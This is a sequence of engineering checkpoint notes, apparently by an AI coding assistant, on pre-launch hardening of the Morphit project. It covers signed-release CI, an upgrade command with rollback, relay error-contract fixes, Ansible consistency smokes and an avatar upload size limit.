# TARBALL — Morphit pre-launch hardening, Part 122 (in progress, checkpoint 8 — release tooling: tag-sig verify in CI, `morphit-ops upgrade`, release-monitor sidecar, UPGRADING.md)

**Snapshot date:** 2026-05-15

---

## REPO STATE NOW (read this first if resuming in a fresh chat)

**Last sealed checkpoint:** Part 122 cp8 (2026-05-15)

**Gates — all green:**
- Triple-pulse: **3,073 × 3 scenarios, 0 failures** (cp7 baseline 3,071 → cp8 +2 from new systemd unit picked up by ansible-systemd-user-consistency smoke + ansible-env-var-consumer smoke)
- Typecheck-sweep: 0 errors across all 10 workspaces

### Release tooling shipped (memory entry #29 closed)

Ken triggered the "release tooling" path. Per memory: manual-only by default; opt-in `MORPHIT_AUTO_UPGRADE=1` for unattended. Four items:

**(1) Tag-signature verify in `.forgejo/workflows/release.yml`.** New step `Verify tag is signed by an authorized key` runs `git verify-tag $TAG` against a keyring populated from `.forgejo/release-signers/*.asc`. Defense against a compromised CI runner producing tarballs from arbitrary commits — only commits whose tag is signed by an authorized maintainer can become releases. Also added a `Generate release-info.json` step that bakes a provenance manifest into the tarball ({tag, commit, build_time, builder}) for `morphit-ops upgrade` to read at the consumer side.

**(2) `.forgejo/release-signers/` directory + README.** Documents how to add/remove authorized signing keys. Each `.asc` file is one maintainer's ASCII-armored GPG pubkey; addition requires a PR with the fingerprint, verified out-of-band by a current maintainer before merge.

**(3) `morphit-ops upgrade` command** (`apps/ops-cli/src/commands/upgrade.ts`, ~480 lines). Subcommand modes:
- `--check-only [--json]`: polls Forgejo `/api/v1/repos/agorise/morphit/releases/latest`, compares against local `release-info.json`, exits 0 (up-to-date) or 1 (newer available). JSON output for scripting.
- (default): full flow — fetch latest → show release notes → confirm (y/N unless `MORPHIT_AUTO_UPGRADE=1`) → download tarball + sha256 → verify SHA-256 → backup `/opt/morphit` → extract → `npm ci` → restart services → roll back on any failure (rollback also restarts services on the previous version). Exit codes: 0 success, 1 newer-available (check-only), 2 user-declined, 3 failed-rolled-back, 4 failed-rollback-failed (manual intervention), 5 preflight-failed.

Configurable env: `MORPHIT_AUTO_UPGRADE`, `MORPHIT_RELEASE_HOST`, `MORPHIT_RELEASE_REPO`, `MORPHIT_INSTALL_DIR`, `MORPHIT_BACKUP_KEEP`. Defaults: `git.agorise.net`, `agorise/morphit`, `/opt/morphit`, 3 backups retained.

What `morphit-ops upgrade` deliberately does NOT do:
- GPG verify the tarball itself (the CI tag-verify chain + Forgejo HTTPS + SHA-256 are sufficient post-CI; operators wanting belt-and-braces verification do `git clone && git tag -v` per UPGRADING.md)
- Schema migrations (post-launch schema changes land as MIGRATIONS[] entries; the indexer applies them at restart)
- Cross-major upgrades (assumed major-version-compatible; major bumps will be called out in release notes)

Wired into `apps/ops-cli/src/main.ts`: dispatch case before db-requiring commands (no DB needed for upgrade), `printHelp` updated, JSDoc subcommands list updated (Sally finding So-2 invariant preserved).

**(4) `morphit-release-monitor` sidecar.** Three files matching the apt-monitor pattern:
- `ops/scripts/morphit-release-monitor.sh` — calls `morphit-ops upgrade --check-only --json`, emits structured event `release_available` (or `release_check_failed`) via journald. Wrapped in `timeout 30` for slow-network defense. **OBSERVATION ONLY** — never applies upgrades itself, per Ken's manual-only preference.
- `ops/systemd/morphit-release-monitor.service` — runs as `morphit-host-monitor` user (no new user creation needed; reuses an existing observation-only user). Full hardening matrix.
- `ops/systemd/morphit-release-monitor.timer` — `OnBootSec=15min, OnUnitActiveSec=6h, RandomizedDelaySec=10min, Persistent=true`. Every 6 hours.

**(5) `docs/UPGRADING.md`** (~330 lines). Comprehensive operator doc covering: how releases work (signed tag → CI → tarball + sha + provenance manifest); recommended path (`morphit-ops upgrade`); check-only mode; automated mode (opt-in); manual upgrade procedure (explicit recipe for operators who prefer to apply each step themselves); belt-and-braces verification (clone + `git tag -v`); rollback procedure; building from source; troubleshooting. Targeted at sysadmins, plain language.

### Pattern lessons

1. **Manual-only upgrade is the right default for non-trivial deploys.** Auto-apply at scale (operator with one VPS) is convenient; auto-apply with multiple instances or production data is a foot-gun. The `MORPHIT_AUTO_UPGRADE=1` opt-in puts the decision in the operator's hands per-deploy, not as a tooling default.

2. **The provenance manifest closes the "did I extract what I thought I was extracting" gap.** Without `release-info.json` inside the tarball, an operator who renames the file or downloads it twice has no on-disk way to confirm the version. With it, `morphit-ops upgrade` and the sysadmin both have an authoritative reference.

3. **Observation sidecars and apply tooling are different roles.** The release-monitor sidecar tells operators when to act; `morphit-ops upgrade` is what they call. Conflating them (auto-apply from the sidecar) is what the manual-only preference is specifically rejecting.

4. **Rollback on failure is non-negotiable.** Half-applied upgrades are the #1 source of "now nothing works" operator pain. The command's exit-code matrix (3 = rolled back, 4 = rollback ALSO failed and needs operator help) makes the boundary explicit; the documented manual recovery procedure exists for code-4 cases.

**Brag list:** unchanged (release tooling is operator-facing infrastructure, not a stranger-cares-about win).

**This session's arc:**
1. cp22 → P122 cp7 as previously documented
2. **P122 cp8** — release tooling shipped (4 components + docs)

**Truly pending (post-cp8):**
- Live full-stack Ansible deploy against fresh Ubuntu 24.04 VM (the v1.0.0-beta.1 first install, in Ken's hands now)
- Real `v*` tag push to validate `.forgejo/workflows/release.yml` end-to-end (Ken: this is the upcoming v1.0.0-beta.1 ceremony)

**Resume directive:** Read this block, then `docs/UPGRADING.md` for the operator-facing surface.

---

**Tarball:** `morphit-audit-2026-05-122-cp8-delta.tar.gz` — delta over cp7.

**Previous tarball:** `morphit-audit-2026-05-122-cp7-delta.tar.gz` (cp6 deep-deep; 7 contract gaps closed; contract-symmetry smoke).

---

**Gates — all green:**
- Triple-pulse: **3,071 × 3 scenarios, 0 failures** (cp6 baseline 3,066 → cp7 baseline 3,071 = +4 new contract-symmetry-smoke scenarios; +1 from secondary effects)
- Typecheck-sweep: **0 errors across all 10 workspaces**
- Both directions of contract-symmetry smoke self-tested by tampering

### Pretext

Ken asked: "does anything you've done in the last 10 turns or so need a deep deep?" Honest inventory:
- cp3, cp4, cp5 WERE deep-deep audits themselves (DNS-rebinding, Matrix/relay redux, sysadmin-handoff)
- cp5-fix and cp5-fix2 were small surfaces / mechanical-smoke fixes — low risk
- **cp6's `@morphit/relay-client` package extraction was real deep-deep candidate** — it's supposed to be the single source of truth for the relay wire contract; if the hand-extraction missed codes or got shapes wrong, the package would silently over-promise (worst-case failure mode for schema-as-contract).

The deep-deep found **seven real contract gaps** in my cp6 extraction. F16-F22 all shipped this turn, plus a contract-symmetry smoke so this exact class of bug can't recur.

### Findings closed

**F16 (LOW informational) — Ghost code `invite_required` in RelayErrorCode.** Pre-cp6 the inline union in signupClient.ts had `invite_required`, but `grep -rn "code: 'invite_required'" apps/relay/src/` returns zero matches. Carried through into the cp6 extraction. Removed — the contract should reflect reality, not aspirations.

**F17 (MEDIUM) — Missing `chunked_unsupported`.** Security middleware (`apps/relay/src/middleware/security.ts:47`) emits this when a request uses `Transfer-Encoding: chunked`. HTTP 411, `status: 'bad_request'`. Any client could hit this.

**F18 (MEDIUM) — Missing `malformed_request`.** Emitted by THREE sites: `middleware/content_type.ts:25` (wrong Content-Type, HTTP 415), `middleware/security.ts:36` (request preprocessing, HTTP 400), `api/availability.ts:62` (malformed body, HTTP 400). All consumer paths could hit this.

**F19 (MEDIUM) — Missing `origin_required` + `origin_not_allowed`.** Origin-enforcement middleware (`apps/relay/src/middleware/origin_enforcement.ts:115, 137`) gates write endpoints — `origin_required` when no Origin header, `origin_not_allowed` when present but not in operator allowlist. Both HTTP 403, `status: 'rejected'`. A community-operator deployment with mis-configured `MORPHIT_RELAY_ALLOWED_ORIGINS` would surface these constantly.

**F20 (LOW) — Missing `internal`.** The `main.ts` onError catch-all (`apps/relay/src/main.ts:299`) emits `{ status: 'error', code: 'internal' }` HTTP 500 when a handler throws an unhandled exception. Rare on the happy path but a legitimate wire shape that must be in the contract.

**F21 (MEDIUM) — Missing non-`'rejected'` rejection envelopes.** The relay can return four distinct top-level statuses for non-success: `'rejected'` (domain + origin/content-type), `'bad_request'` (chunked-encoding), `'error'` (internal), `'not_found'` (unmatched route). My cp6 extraction modeled only `'rejected'`. Fix: split into `RelayRejection` + `RelayBadRequest` + `RelayInternalError` + `RelayNotFound`, union them as `RelayGenericFailure`, include in every endpoint's response union.

**F22 (LOW) — Missing `message?: string` on rejections.** Several relay rejection paths populate a human-readable `message` field (e.g. origin middleware: "This relay only accepts account-creation requests from operator-configured frontends."). Documented in the new field's JSDoc that consumers should i18n by `code` and treat `message` as a debug hint, not user-facing copy.

### Contract-symmetry smoke — F23 class defense

**New file: `packages/relay-client/scripts/contract-symmetry-smoke.ts`** (4 scenarios). Walks `apps/relay/src/` for every `code: '<literal>'` string (excluding `*.test.ts`), parses `RelayErrorCode`'s union from `packages/relay-client/src/index.ts`, asserts **two-way symmetry**:

- **Direction A:** Every wire-emitted code is in the union. Missing codes mean the contract under-promises — consumers see runtime codes that aren't in the type system, fall through to default handlers, lose actionable error info. This was the cp6 failure mode (F17-F20).
- **Direction B:** Every union member is emitted by the relay. Ghost members mean the contract over-promises — consumers prepare for codes that never arrive, dead i18n keys, dead error-handling branches. This was F16's failure mode.

Internal-only codes (e.g. `decryption_failed` in `crypto/keyEnvelope.ts`'s `Result` type, `no_tty` in `crypto/promptPassphrase.ts`'s startup-error type) that never reach an HTTP response are explicitly listed in `INTERNAL_ONLY_CODES` and excluded from the symmetry check.

**Smoke development surfaced a real bug in itself:** the union-parsing regex `/export type RelayErrorCode =([^;]+);/m` was truncating at the first `;` inside JSDoc block comments (e.g. "Chunked transfer-encoding rejected; client must send Content-Length."). Fixed by stripping block + line comments before applying the union regex. This is documented in the smoke's source as a pattern lesson — regex-based parsers must consider comment escaping when comments can contain delimiter characters.

**Self-tested both directions:**
- Removed `| 'origin_required'` from the union → smoke fires `✗ direction A` with diagnostic naming the missing code
- Added `| 'ghost_code_test'` to the union → smoke fires `✗ direction B` with diagnostic naming the ghost
- Restoration → 31 wire-emitted ↔ 31 union members, all 4 scenarios pass

**Registered** in `scripts/run-smokes.sh` after the operator-config smoke.

### Pattern lessons

1. **Hand-extracting wire contracts is unsafe.** I read the relay code carefully when building cp6 and still missed 5 wire-emitted codes plus 3 non-`'rejected'` envelope shapes. A mechanical symmetry check pays for itself the first time it runs.

2. **Schema-as-contract packages must include their own validation smoke.** Otherwise the package's value (single source of truth) is only as good as the extraction at the moment it landed. The contract-symmetry smoke is now part of the package's surface — it's how the package proves it's still aligned with reality.

3. **The smoke that catches drift may itself have parser bugs.** F23a (the JSDoc-comment-semicolon-truncating-my-regex bug in my own smoke) was a real bug that would have silently let the missing codes slip through. The 4-scenario sanity meta-checks (Direction A + Direction B + minimum-count emitted + minimum-count union) caught it because the union-parse came back impossibly short.

4. **Internal-only Result-type codes ≠ wire-emitted codes.** `apps/relay/src/policy/altcha.ts` and `apps/relay/src/policy/inviteToken.ts` both use the Result-type pattern (`| { ok: false; code: 'altcha_malformed' }`) — these codes ARE wire-emitted (the api/invite.ts handler unwraps the Result and emits the code). But `crypto/keyEnvelope.ts` uses an identical Result-shape pattern for keystore-decryption codes that NEVER reach HTTP. The symmetry smoke can't tell these apart by code alone; that's what `INTERNAL_ONLY_CODES` is for, and the README of new-code additions should ask "is this code reachable from an HTTP response?" before deciding which list to update.

### Severity perspective

The cp6 contract gaps had no immediate user impact (signupClient.ts uses `(body.code as SignupErrorCode) ?? 'broadcast_failed'` so unknown codes fall through to a sensible default). But the pattern was real: the schema-as-contract package was lying about what the wire contract was. Two hypothetical concrete scenarios that would have broken without cp7:

- Operator deploys with mis-configured `MORPHIT_RELAY_ALLOWED_ORIGINS` → frontend gets `origin_not_allowed` → signupClient.ts displays `signup.error.broadcast_failed` ("Couldn't broadcast — try again later") instead of the actionable "Your origin isn't allowed by this relay" message. Operator chases a phantom RPC bug.
- Network bug causes a Transfer-Encoding: chunked request → frontend gets `chunked_unsupported` → displays `broadcast_failed`. Same misdiagnosis.

Both surfaces are now properly typed.

**Brag list:** 265 entries unchanged. Internal contract hardening.

**This session's arc:**
1. cp22 → P122 cp6 as previously documented
2. **P122 cp7** — deep-deep audit of cp6 found seven contract gaps in @morphit/relay-client; F16-F22 closed; contract-symmetry smoke shipped + self-tested both directions

**Truly pending (post-cp7):**
- Live full-stack Ansible deploy against a fresh Ubuntu 24.04 VM
- Real `v*` tag push to validate `.forgejo/workflows/release.yml`
- Upgrade tooling — parked for first-release week per memory entry #29
- Schema-as-contract second-layer adoption on the relay side (typing Hono `c.json()` returns) — post-launch hardening

**Resume directive:** Read this block, then `docs/REVISIT-LIST.md`'s "Last maintained" entry (still on cp5 — cp5-fix/fix2/cp6/cp7 are same-checkpoint follow-ons).

---

**Tarball:** `morphit-audit-2026-05-122-cp7-delta.tar.gz` — delta over cp6.

**Previous tarball:** `morphit-audit-2026-05-122-cp6-delta.tar.gz` (F7/F8/relay-client first contract layer).

---

**Gates — all green:**
- Triple-pulse: **3,066 × 3 scenarios, 0 failures** (cp5-fix2 baseline 3,057 → cp6 baseline 3,066 = +9: 4 new schema-migration-coverage-smoke scenarios + 1 new P122-CP6 sentinel + 4 from secondary effects of the new package landing in workspace-graph smokes)
- Typecheck-sweep: **0 errors across all 10 workspaces** (was 9; relay-client added this turn)
- Both new smokes self-tested by tampering

**This-turn deliverable: three of the four standing REVISITs that were cleanly in-scope; the fourth (ansible-lint in CI) was already done and the standing list was stale.**

### F7 — `assertNoRegexMatch` runner primitive + broader S-12 ariaLabel sentinel

**Primitive added** to `apps/web/scripts/persona-walkthrough-smoke.ts`: new optional `assertNoRegexMatch?: { pattern: RegExp; reason: string }[]` field on the `Scenario` interface, alongside the existing `mustHave`, `mustNotHave`, and `assertOrdering`. Strips the global flag defensively, runs `exec()` against the file body, surfaces the first match in the diagnostic.

**S-12 ariaLabel sentinel extended** with regex coverage. Pre-cp6 the sentinel listed three literal forbidden strings (`ariaLabel="What is BLURT?"`, `ariaLabel="What is BTC?"`, `ariaLabel="What is XMR?"`); a future asset like LTC or DOGE added with the same anti-pattern would have silently slipped through. The new `assertNoRegexMatch: [{ pattern: /\bariaLabel="[^"]*"/ }]` catches every Svelte `ariaLabel="..."` literal-string prop on `/post`, regardless of ticker. Acceptable forms (no prop → `effectiveAriaLabel` default, or `{$_("...")}` expression value) don't match because `{` ≠ `"`.

**Self-tested:** injected `ariaLabel="What is USDT?"` → sentinel fires with `REGEX MATCH (forbidden pattern fired): /\bariaLabel="[^"]*"/` + "first hit: ariaLabel=\"What is USDT?\""; restoration → clean.

### F8 — schema-migration coverage smoke

**New file: `apps/indexer/scripts/schema-migration-coverage-smoke.ts`** (4 scenarios). Tighter form of cp2's F5 sentinel: instead of pinning a brittle literal head-version COMMENT STRING (which broke whenever an editor tweaked the prose), the smoke PARSES both schema.sql and migrations.ts and pins the DERIVED NUMERIC values.

**Defenses:**
1. `schema.sql` highest `-- v<N>` banner === `SCHEMA_HEAD_VERSION` (32). Strict banner-form regex (`^--\s+v(\d+)(?:\s*$|\s+\/\s+)`) excludes narrative references like `-- v5 used to add...` or `-- v1-v27 stay with treasury IS NULL` — only matches actual section banners.
2. `MIGRATIONS[]` coverage (union of `version:` and every integer in `subsumesVersions: [...]`) highest === `MIGRATIONS_COVERAGE_HIGH` (27).
3. `SCHEMA_HEAD_VERSION ≥ MIGRATIONS_COVERAGE_HIGH` (sanity: MIGRATIONS[] can't cover a version that doesn't exist).
4. No schema banner above the pinned head (catches the "added v33 but forgot to bump the pin" path).

**Inline-only window** documented in smoke header: `v28..v32 = 5 versions` is acceptable PRE-launch because every deploy is fresh and applies `schema.sql` in full. Post-launch, new schema versions must land as `MIGRATIONS[N]` entries with proper DDL, not inline; the smoke fails until the developer either adds the entry OR consciously updates `EXPECTED_INLINE_ONLY_VERSIONS` (which forces same-turn audit of the gap).

**Self-tested both directions:**
- Add `-- v33 / ...` banner to schema.sql → smoke fires `✗ schema.sql highest -- v<N> banner === SCHEMA_HEAD_VERSION (32)` + `✗ no schema.sql -- v<N> banner above pinned head`
- Add `MIGRATIONS[28]` entry to migrations.ts → smoke fires `✗ MIGRATIONS[] coverage highest === MIGRATIONS_COVERAGE_HIGH (27)` with diagnostic showing the new computed inline gap (`v29..v32 = 4 versions`)
- Restoration → clean

**Registered** in `scripts/run-smokes.sh` at end of indexer block as `apps/indexer:schema-migration-coverage-smoke`.

### #3 — ansible-lint in CI — **NOT A REAL TODO; already done**

**Discovered during work:** `.forgejo/workflows/ci.yml` lines 63-87 already has a dedicated `ansible-lint` job:
- Installs Python 3.12 + ansible-lint via `pip3 install --break-system-packages`
- Installs required ansible collections via `ansible-galaxy collection install -r ops/ansible/collections/requirements.yml`
- Runs `ansible-lint --offline --strict playbook.yml` from `ops/ansible/`

Plus the `smokes` job (lines ~110-119) ALSO installs ansible-lint so the `apps/ops-cli:ansible-lint-smoke` runner has it available during the smoke suite. The "ansible-lint integration in CI" item on my standing-pending list was stale. Honest correction owed and made in cp6.

### #4 — `@morphit/relay-client` (PHASE F first contract layer)

**Pattern mirrored from `@morphit/indexer-client`.** Created:
- `packages/relay-client/package.json` (name: `@morphit/relay-client`, version: `0.1.0-phase-f`, AGPL-3.0)
- `packages/relay-client/tsconfig.json` (byte-identical compiler options to indexer-client)
- `packages/relay-client/src/index.ts` (260 lines, types-only)

**Types exported:**
- `RelayErrorCode` — wire-contract union of 25 distinct error codes the relay can emit (`signups_disabled`, `daily_ceiling_reached`, `invite_rate_limited`, 5 altcha codes, 17 create-endpoint codes)
- `RelayRejection` — common rejection envelope with optional `retry_after_minutes` and `resets_at`
- `AltchaChallenge` — opaque PoW challenge shape
- `RelayInviteIssued`, `RelayInviteAltchaRequired`, `RelayInviteResponse` (discriminated union of three shapes)
- `RelayCreateBroadcast`, `RelayCreateResponse`
- `RelayAvailabilityAvailable`, `RelayAvailabilityUnavailable`, `RelayAvailabilityResponse`
- `RelayHealthMinimal`, `RelayHealthVerbose`, `RelaySignupStats`, `RelayHealthResponse`

**Workspace integration:**
- Added `packages/relay-client` to root `package.json` workspaces (alphabetically positioned between indexer-client and operator-config)
- `npm install` ran cleanly; workspace symlink created at `node_modules/@morphit/relay-client`
- Added relay-client to `scripts/typecheck-sweep.sh`; the sweep now covers 10 workspaces (was 9), all 0 errors

**First consumer refactored:**
- `apps/web/src/lib/auth/signupClient.ts` — pre-cp6 had 25 relay error codes duplicated inline as part of `SignupErrorCode`; post-cp6 imports `RelayErrorCode` from `@morphit/relay-client` and extends it with two client-local codes (`'unreachable'`, `'altcha_unsolvable'`). The relay-emit-able subset is now single-sourced.

**Sentinel — `P122-CP6`** in persona-walkthrough-smoke.ts pins both legs of the contract:
- `mustHave: ["import('@morphit/relay-client').RelayErrorCode"]` — the import must survive
- `mustNotHave: ["| 'invite_rate_limited'", "| 'spacing_cooldown'"]` — rejects re-inlining of the duplicate codes (targets the two most distinctive ones)

If anyone reverts the schema-as-contract approach by re-duplicating the union inline, both halves of the sentinel fire.

### Pattern lessons

1. **Pinning derived values is more resilient than pinning literals.** F5 pinned the entire head-comment STRING; F8 pins just the NUMBER. Prose drift no longer breaks the sentinel — only semantic drift does. This is the right shape for any sentinel whose underlying invariant is numeric, version-shaped, or otherwise structurally derivable.

2. **Stale standing-REVISIT lists are a finding class.** Item #3 (ansible-lint in CI) was already done; the standing list had it as pending. Pattern: every standing item should get a sanity-grep check before being claimed as gating. A 30-second verification could have avoided me listing it.

3. **First contract layer is the easiest contract layer to ship.** signupClient.ts had the duplicate-union shape begging for extraction; the relay-side endpoint files (`apps/relay/src/api/*.ts`) use Hono's untyped `c.json()` and don't easily accept the new types yet. Shipping the client-side import as the MVP gets the schema-as-contract pattern landed without forcing a full relay-side return-type refactor; future contributors can adopt the types on the relay side incrementally.

4. **Subset typing via `import('@module').T` syntax avoids package-graph noise.** Using `type SignupErrorCode = import('@morphit/relay-client').RelayErrorCode | ...` keeps `signupClient.ts` from needing a top-level import that drags in unrelated symbols. Same pattern Svelte already uses for its `import('svelte/store').Writable` references.

**Brag list:** 265 entries unchanged. cp6 is internal contract hardening — not a stranger-cares-about win for the brag list per cp19 discipline.

**This session's arc:**
1. cp22 → P122 cp5-fix2 as previously documented
2. **P122 cp6** — standing-REVISIT cleanup (F7 regex primitive + broader ariaLabel sentinel; F8 schema-migration coverage smoke; ansible-lint-in-CI confirmed already done; @morphit/relay-client first contract layer with signupClient consumer refactored)

**Truly pending (post-cp6):**
- Live full-stack Ansible deploy against a fresh Ubuntu 24.04 VM (the single remaining real launch-gating item)
- Real `v*` tag push to validate `.forgejo/workflows/release.yml` end-to-end
- Upgrade tooling — parked for first-release week per memory entry #29
- **Schema-as-contract second-layer adoption:** the relay-side endpoint files could import `RelayInviteResponse` etc. and use them to type their Hono `c.json(...)` returns. This was not in cp6 scope; the indexer-client equivalent also doesn't do this. Filed as a "post-launch hardening" item — typing untyped Hono returns is a refactor with non-zero risk and minimal pre-launch value.

**Resume directive:** Read this block, then `docs/REVISIT-LIST.md`'s "Last maintained" entry (still on cp5 — cp5-fix/fix2/cp6 are same-checkpoint follow-ons, not new sealed checkpoints).

---

**Tarball:** `morphit-audit-2026-05-122-cp6-delta.tar.gz` — delta over cp5-fix2.

**Previous tarball:** `morphit-audit-2026-05-122-cp5-fix2-delta.tar.gz` (two mechanical smokes + F15 dead env-var-name fixes).

---

**Gates — all green:**
- Triple-pulse: **3,057 × 3 scenarios, 0 failures** (cp5-fix baseline 2,965 → cp5-fix2 baseline 3,057 = +92 = 17 scenarios in new `ansible-systemd-user-consistency-smoke` + 75 scenarios in new `ansible-env-var-consumer-smoke`)
- Typecheck-sweep: 0 errors across all 9 workspaces
- Both new smokes self-tested by tampering

**This-turn deliverable: two cp5-surfaced follow-on smokes shipped, both of which immediately surfaced new findings on their first real run.**

### Smoke 1 — `apps/ops-cli/scripts/ansible-systemd-user-consistency-smoke.ts`

**Rule:** every `User=X` referenced in a shipped `ops/systemd/*.service` unit either (a) is a well-known system user that pre-exists on a standard Ubuntu 24.04 box (root, nobody, www-data, postgres, systemd-network, systemd-resolve, systemd-timesync, daemon), OR (b) is created by an `ansible.builtin.user: name: X` task in `ops/ansible/roles/`.

Handles Jinja-templated names like `name: "{{ morphit_service_user }}"` by resolving the variable against `ops/ansible/group_vars/all.yml`.

Skips units with `DynamicUser=yes` (User= is irrelevant for those).

**Scenarios:** 17 (16 units scanned, 4 Ansible-created users, 1 sanity meta-check).

**Self-test:** removed the `morphit-relay` user-creation task from `base/tasks/main.yml` → smoke correctly fires for BOTH `morphit-relay.service` and `morphit-relay-mint-acts.service` with a clear diagnostic ("morphit-relay.service ships with User=morphit-relay, but the Ansible playbook has no `ansible.builtin.user: name: morphit-relay` task creating it AND morphit-relay is not in the system-default allowlist. Either add the user-creation task to a role... or — if morphit-relay really is a pre-existing system account — add it to SYSTEM_USER_ALLOWLIST in this smoke."). Restoration → clean.

This smoke would have mechanically caught F12 from cp5. Future regressions of the same class are now caught at PR time.

### Smoke 2 — `apps/ops-cli/scripts/ansible-env-var-consumer-smoke.ts`

**Rule:** every LITERAL `MORPHIT_X=...` line in an Ansible `*.env.j2` template must have its variable name referenced somewhere in `apps/**/*.{ts,tsx,js,mjs}` (excluding `.d.ts`) OR `ops/scripts/*.sh` OR `ops/scripts/lib/*.sh`.

Template lines where the variable NAME itself is Jinja-templated (e.g. `MORPHIT_FAIL2BAN_{{ var_jail }}_CRITICAL=...`) are SKIPPED — those are documented dynamic-dispatch patterns; the consumer reads them via pattern construction, which we can't statically validate.

Comment lines in templates (`#` prefix) are skipped.

**Scenarios:** 75 (72 unique template vars, 2 sanity meta-checks plus the per-var checks).

**Self-test:** added a synthetic `MORPHIT_RELAY_DEAD_PASSPHRASE_TEST={{ test }}` line → smoke correctly fires with `✗ MORPHIT_RELAY_DEAD_PASSPHRASE_TEST has a consumer in apps/ or ops/scripts/`. Restoration → clean.

This smoke would have mechanically caught F13 from cp5 (the dead `MORPHIT_RELAY_PASSPHRASE`).

### What smoke 2 surfaced — F15 (HIGH)

On its first real run, smoke 2 surfaced **six dead env-var names** in the Ansible templates that the code never reads. Same class as F12 (broken on first Ansible deploy):

| Template var (pre-fix) | Code expects | Impact |
|---|---|---|
| `MORPHIT_INDEXER_BIND_HOST` | `MORPHIT_INDEXER_LISTEN_HOST` | Indexer bind host config silently ignored |
| `MORPHIT_INDEXER_BIND_PORT` | `MORPHIT_INDEXER_LISTEN_PORT` | Indexer bind port config silently ignored |
| `MORPHIT_INDEXER_OPERATOR_ACCOUNT` | `MORPHIT_INDEXER_OPERATOR_ACCOUNT_NAME` | Community-operator account name unset → per-operator moderation features broken |
| `MORPHIT_INDEXER_OPERATOR_TAG` | `MORPHIT_INSTANCE_OPERATOR_TAG` | Operator tag (federation attribution) unset → community operators not properly tagged in the federation |
| `MORPHIT_RELAY_BIND_HOST` | `MORPHIT_RELAY_LISTEN_HOST` | Relay bind host config silently ignored |
| `MORPHIT_RELAY_BIND_PORT` | `MORPHIT_RELAY_LISTEN_PORT` | Relay bind port config silently ignored |

For canonical morphit.io with defaults, the bind host/port issue is moot (defaults are correct). But for any community operator who configures custom bind values via `group_vars`, their config would be silently ignored. The operator-account-name and operator-tag issues are more serious — community-operator features (per-operator content moderation, federation tagging) would be broken.

**Severity HIGH:** same class as F12 — broken on first Ansible deploy. The defects were latent because (a) memory's "Live full-stack Ansible deploy" is still in PENDING, (b) the canonical morphit.io defaults happen to match the code's defaults for the bind values, so the broken ones for community operators went unnoticed.

**Fix shipped:** corrected all 6 template var names to match code. No additional sentinel needed because the env-var-consumer smoke IS the sentinel — any future drift fails the smoke at PR time.

### Pattern lesson

Both smokes were filed at cp5-close as "would have mechanically caught F12 / F13." This is exactly what mechanical smokes are for — they don't trust the human auditor to remember to check the cross-layer invariant. Smoke 2 immediately paid for itself by surfacing F15, which was the EXACT class of bug F13 represented (dead env vars in templates) but a different INSTANCE that the cp5 human audit had missed.

**Three of the six F15 dead vars are operator-affecting (account name, operator tag, plus the 3 bind values for community operators).** Memory's "Live full-stack Ansible deploy" being in PENDING was, again, an accurate alarm bell for handoff bugs. Pre-launch is the right time to land mechanical handoff smokes precisely because they catch the LATENT defects that a successful first VM deploy would have surfaced expensively.

**Brag list:** 265 entries unchanged. Internal handoff hardening + bug-discovery — not stranger-cares-about wins for the brag list.

**This session's arc (cp22 → P122 cp5-fix2):**
1. cp22 → P122 cp5-fix as previously documented
2. **P122 cp5-fix2** — shipped two mechanical handoff smokes (systemd-user-consistency, env-var-consumer); env-var-consumer smoke surfaced F15 (HIGH, 6 dead env-var-name mismatches), fix shipped same turn

**Resume directive:** Read this block, then `docs/REVISIT-LIST.md`'s "Last maintained" entry (still on cp5 — cp5-fix and cp5-fix2 are same-checkpoint follow-ons, not new sealed checkpoints).

---

**Tarball:** `morphit-audit-2026-05-122-cp5-fix2-delta.tar.gz` — delta over cp5-fix.

**Previous tarball:** `morphit-audit-2026-05-122-cp5-fix-delta.tar.gz` (avatar UX gap close + F14 wizard step doc drift).

---

**Gates — all green:**
- Triple-pulse: **2,965 × 3 scenarios, 0 failures** (cp5 baseline 2,963 → cp5-fix baseline 2,965 = +2 = P122-CP5-F14 + P122-CP5-F14b)
- Typecheck-sweep: 0 errors across all 9 workspaces
- Locale parity: 10/10 carrying the 2 new avatar strings

**This-turn deliverable: two operator-facing finds + their fixes, after Ken asked for verification of avatar UX + sysadmin doc completeness.**

### Avatar-upload UX gap closed (Ken's question)

Ken: "when a user wants to upload their own avatar image for their profile, is there something on the ui that tells the user what the ideal image size is, in pixels, as well as what the max allowable filesize is? make it friendly of course, just some fine print that details that. disallow any images that do not fit within those specs of course. please verify."

Verified state of avatar UX in `apps/web/src/routes/[lang]/settings/+page.svelte` + `apps/web/src/lib/avatar/index.ts`:

- ✅ **Ideal pixel dimensions communicated.** `settings.avatar.guidance_dimensions` already said "Ideal source: a square image at least 96×96 pixels. Anything larger will be resized down to 96×96 for you; anything smaller will look grainy."
- ✅ **Filetypes communicated.** "Accepts SVG, WebP, JPEG, PNG, or GIF."
- ✅ **Output payload limit communicated.** "The final payload must fit under 3 KB."
- ✅ **Permanence warning** present (on-chain forever).
- ✅ **SVG security tips** present.
- ✅ **Already enforced**: unsupported types (`unsupported_type`), empty files (`empty_file`), too-complex SVGs (`svg_too_large`), output-too-large rasters (`raster_too_large`), decode failures (`raster_decode_failed`), missing canvas support, missing WebP support — all surface to a friendly user-facing error message.
- ❌ **Gap (FIXED this turn): no INPUT filesize gate.** The 3 KB cap is on the OUTPUT payload (after Canvas resize + WebP re-encode). A user uploading a 100 MB JPEG would have it passed straight to `createImageBitmap` — which has no documented behavior for huge inputs and would freeze the tab for many seconds before our downstream checks could see anything. Also: the user wasn't told that there's any kind of upper bound on the source file.

**Fix shipped:**

1. New `MAX_INPUT_FILE_BYTES = 5 * 1024 * 1024` (5 MB) constant in `apps/web/src/lib/avatar/index.ts`. Five MB is generous for modern phone photos (which get downsampled to 96×96 anyway), tight enough to prevent tab-DoS on a paste of a huge file.
2. New `input_too_large` error code added to `AvatarErrorCode`.
3. New early-return gate in `processAvatarFile`: if `file.size > MAX_INPUT_FILE_BYTES`, return `input_too_large` BEFORE any expensive image decode runs. Users see a friendly error instead of a frozen tab.
4. New `settings.avatar.guidance_filesize` user-facing bullet ("Source file size: up to 5 MB. Larger images will be downsampled to 96×96 automatically, so even a phone photo straight from your camera works fine.") — added to the UI guidance card between `guidance_dimensions` and `guidance_size` for logical ordering (input size → output size).
5. Matching `settings.avatar.error.input_too_large` localized error message ("That image is too large to upload. Please choose a file under 5 MB.").
6. **All 10 locales updated** with native-language translations (en/es/fr/de/it/pl/ru/fa/zh-CN/zh-HK) — locale parity rule per memory.

